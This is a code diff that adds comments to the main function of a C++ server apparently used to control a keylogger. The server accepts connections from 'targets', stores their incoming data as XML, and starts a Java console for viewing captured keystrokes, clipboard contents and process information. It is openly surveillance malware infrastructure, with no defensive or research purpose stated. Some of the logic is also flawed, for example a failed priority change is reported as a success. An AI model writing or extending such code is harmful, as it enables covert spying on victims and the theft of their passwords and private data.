@@ -228,60 +228,147 @@ void Handler()
         }
 }
 /**
-    this is a temporary server used for testing, future changes will be established
+    Title: main, initiates the java virtual machine and starts the 
+    two threads that process connections. thread 1 controls the initial
+    connections and inserts them into a self referential linked list, 
+    thread 2 iterates through the linked list and reads any incoming data 
+    to an xml file. 
+    the main thread finishes by transitioning into the jvm which is left to 
+    control the user interface. the user-interface is subject to change over the 
+    course of time but should enable the user to do the following.
+        1.) view all incoming connections from targets.
+        2.) display dumps of the xml in a human readable form to the end user. 
 */
 int main()
 {
-
+    /*
+        set a global counter on the number of established connections to zero.
+    */
     ConnectionCount=0;
-
+    /*a
+        initiate the mutex lock that secures the connection buffer during any 
+        access.
+    */
     mu = CreateMutex(NULL,false,NULL);
-
+    /*
+        wait until this thread can get a handle to the mutex lock and establish
+        that a lock is present.
+    */
     WaitForSingleObject(mu,INFINITE);
-    sched_param sch_params;
+    /*
+        establish a schedule parameter to set a high priority thread on the listener 
+        thread and the handler thread
+    */
+    sched_param sch_params; 
+    /*
+        set the scheduler priority to the highest priority.
+            [NOTE: this is not a real time thread. DO NOT change this thread priority 
+            to real time under any circumstance]
+    */
     sch_params.sched_priority =THREAD_PRIORITY_HIGHEST;
+    /*
+        start the listener thread that will connect clients and insert the socket into 
+        a self referential linked list.
+    */
     std::thread thread1 (Listener);
+    /*
+        attempt to increase the listener threads priority to a high priority thread.
+    */
     if(pthread_setschedparam(thread1.native_handle(),SCHED_RR,&sch_params))
     {
         printf("[*] priority of connection listener increased successfully!\n");
     }
+    /*
+        establish the thread that handles the data that comes in on the connections.
+    */
     std::thread thread2 (Handler);
-    pthread_setschedparam(thread2.native_handle(),SCHED_RR,&sch_params);
-    if(pthread_setschedparam(thread1.native_handle(),SCHED_RR,&sch_params))
+    /*
+        attempt to increase the handler threads priority to high priority.
+    */
+    if(pthread_setschedparam(thread2.native_handle(),SCHED_RR,&sch_params))
     {
         printf("[*] priority of data listener increased successfully!\n");
     }
+    /*
+        now that the threads have been started and their process level has increased 
+        the mutex can be unlcoked allowing for the other threads to begin processing.
+    */
     ReleaseMutex(mu);
+    /*  
+        release the remainder of the quantum and wait for 1/10th of a second before initiating
+        the java thread, give the handler and listener time to process without a priority boost 
+        interrupt.
+    */
     Sleep(100);
+    /*
+        create the variable that stores the initiating java virtual machine arguments.
+    */
     JavaVMInitArgs args;
+    /*
+        create a new jvm options to store the class path
+    */
     JavaVMOption *option = new JavaVMOption[1];
+    /*
+        set the class path relative to the binary and locate the keylogger interface.
+    */
     option[0].optionString= const_cast<char*>("-Djava.class.path=.\\KeyLoggerInterface\\build\\classes;");
+    /*
+        initiate the jvm to version 8 
+    */
     args.version = JNI_VERSION_1_8;
+    /*
+        only one argument is being passed to the virtual machine
+    */
     args.nOptions = 1;
+    /*
+        the argument which is used to init the class file is set here.
+    */
     args.options = option;
     args.ignoreUnrecognized = false;
+    /*
+        crate the jvm with all relevant information
+    */
     jint k = JNI_CreateJavaVM(&jvm,reinterpret_cast<void**>(&env),&args);
+    /*
+        if the java native interface was not properly established then exit.
+    */
     if (k != JNI_OK)
     {
 
         return -1;
     }
-
+    /*
+        select the classes to run which are at the directory previously established.
+    */
     jclass cls = env->FindClass("keyloggerinterface/KeyLoggerInterface");
+    /*
+    load all the relavant native interfaces from the jvm and set them to the appropriate native function call
+    */
     JNINativeMethod methods[] = {const_cast<char*>("getBuffer"), const_cast<char*>("()[Lkeyloggerinterface/KeyLoggerInterface$keylogdata;"), (void*)&getBuffer,
                                 const_cast<char*>("setConsoleColorDefault"), const_cast<char*>("()V"),(void*)&setConsoleColorDefault,
                                 const_cast<char*>("setConsoleColorCaptureInformationCB"), const_cast<char*>("()V"),(void*)&setConsoleColorCaptureInformationCB,
                                 const_cast<char*>("setConsoleColorProcessInformation"), const_cast<char*>("()V"),(void*)&setConsoleColorProcessInformation,
                                 const_cast<char*>("setConsoleColorTitleInformation"), const_cast<char*>("()V"),(void*)&setConsoleColorTitleInformation,
                                 const_cast<char*>("setConsoleColorCaptureInformationKL"), const_cast<char*>("()V"),(void*)&setConsoleColorCaptureInformationKL};
-
+    /*
+        locate the init method in the class file and proceed with a call to create a new object.
+    */
     jmethodID Init = env->GetMethodID(cls,"<init>","()V");
     jobject obj = env->NewObject(cls,Init);
+    /*
+        register all the native methods from the jvm back to native code.
+    */
     env->RegisterNatives(cls,methods,6);
-    jmethodID Init_Gui = env->GetMethodID(cls,"Console","()V");
-    env->CallVoidMethod(obj,Init_Gui);
+    /*
+        define the entry point method into the jvm.
+    */
+    jmethodID Init_Console = env->GetMethodID(cls,"Console","()V");
+    /*
+        call the initiating java method.
+    */
+    env->CallVoidMethod(obj,Init_Console);
     delete option;
-    thread1.join();
+    thread1.join(); // never passes this point.
 
 
     return 0;
